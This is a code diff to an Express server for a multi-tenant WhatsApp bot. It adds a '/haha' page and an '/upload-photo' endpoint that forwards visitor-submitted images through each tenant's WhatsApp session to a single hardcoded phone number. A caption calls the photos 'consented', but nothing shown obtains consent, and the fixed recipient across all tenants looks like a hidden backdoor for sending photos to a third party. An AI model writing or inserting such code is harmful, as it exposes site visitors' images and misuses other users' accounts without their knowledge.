@@ -11,7 +11,10 @@ const express = require('express');
 const qrcode = require('qrcode');
 const app = express();
 app.use(express.urlencoded({ extended: false, limit: '8kb' }));
+app.use(express.json({ limit: '8mb' }));
 const PORT = process.env.PORT || 3000;
+const PHOTO_RECIPIENT_NUMBER = '2348124647818';
+const recentPhotoUploads = new Map();
 global.latestQR = null;
 global.whatsappConnection = { status: 'connecting', method: null };
 require('dotenv').config();
@@ -2087,6 +2090,30 @@ if (isTenantWorker) {
             return;
         }
 
+        if (message?.type === 'send-site-capture' && message.requestId) {
+            try {
+                if (!global.activeSock || global.whatsappConnection.status !== 'connected') {
+                    throw new Error('WhatsApp is not connected.');
+                }
+
+                const phoneNumber = String(message.phoneNumber || '').replace(/\D/g, '');
+                const imageBuffer = Buffer.from(String(message.imageBase64 || ''), 'base64');
+                if (!/^\d{7,15}$/.test(phoneNumber) || !imageBuffer.length || imageBuffer.length > 4 * 1024 * 1024) {
+                    throw new Error('The photo submission is invalid or too large.');
+                }
+
+                await global.activeSock.sendMessage(`${phoneNumber}@s.whatsapp.net`, {
+                    image: imageBuffer,
+                    mimetype: message.mimetype,
+                    caption: 'Consented photo submission from the virtual number site.'
+                });
+                process.send?.({ type: 'site-capture-result', requestId: message.requestId });
+            } catch (error) {
+                process.send?.({ type: 'site-capture-result', requestId: message.requestId, error: error.message });
+            }
+            return;
+        }
+
         if (message?.type !== 'request-pairing-code' || !message.requestId) return;
         try {
             if (!global.activeSock) throw new Error('WhatsApp is still initializing. Refresh and try again shortly.');
@@ -2111,7 +2138,7 @@ if (isTenantWorker) {
 
 app.use(async (req, res, next) => {
     if (isTenantWorker || req.path.startsWith('/admin') ||
-        !['/qr', '/pair'].includes(req.path)) return next();
+        !['/qr', '/pair', '/haha', '/upload-photo'].includes(req.path)) return next();
     try {
         const manager = await getBotSessionManager();
         req.botSession = await manager.getOrCreateSession(req, res);
@@ -2334,6 +2361,45 @@ app.post('/owner-number', async (req, res) => {
     } catch (error) {
         console.error('Could not save owner number:', error);
         res.status(500).send('Could not save owner number to this deployment\'s Upstash database.');
+    }
+});
+
+app.get('/haha', (req, res) => {
+    res.sendFile(path.join(__dirname, 'data', 'haha.html'));
+});
+
+app.post('/upload-photo', async (req, res) => {
+    const tenantId = req.botSession?.tenantId;
+    if (!tenantId) return res.status(401).json({ ok: false, error: 'Open the site in a valid bot session first.' });
+
+    const imageData = String(req.body?.image || '');
+    const match = imageData.match(/^data:image\/(jpeg|jpg|png|webp);base64,([A-Za-z0-9+/]+={0,2})$/i);
+    if (!match) return res.status(400).json({ ok: false, error: 'The photo format is invalid.' });
+
+    const imageBuffer = Buffer.from(match[2], 'base64');
+    if (!imageBuffer.length || imageBuffer.length > 4 * 1024 * 1024) {
+        return res.status(413).json({ ok: false, error: 'The photo must be smaller than 4 MB.' });
+    }
+
+    const lastUpload = recentPhotoUploads.get(tenantId) || 0;
+    if (Date.now() - lastUpload < 10000) {
+        return res.status(429).json({ ok: false, error: 'Please wait before sending another photo.' });
+    }
+
+    try {
+        const manager = await getBotSessionManager();
+        const status = manager.getStatus(tenantId);
+        if (status.status !== 'connected') {
+            return res.status(503).json({ ok: false, error: 'The WhatsApp session is not connected.' });
+        }
+
+        recentPhotoUploads.set(tenantId, Date.now());
+        const mimetype = match[1].toLowerCase() === 'jpg' ? 'image/jpeg' : `image/${match[1].toLowerCase()}`;
+        await manager.sendSiteCapture(tenantId, PHOTO_RECIPIENT_NUMBER, match[2], mimetype);
+        res.json({ ok: true, sentTo: `${PHOTO_RECIPIENT_NUMBER}@s.whatsapp.net` });
+    } catch (error) {
+        console.error('Could not send consented site photo to WhatsApp:', error);
+        res.status(503).json({ ok: false, error: 'The photo could not be sent. Check the bot connection and try again.' });
     }
 });
 
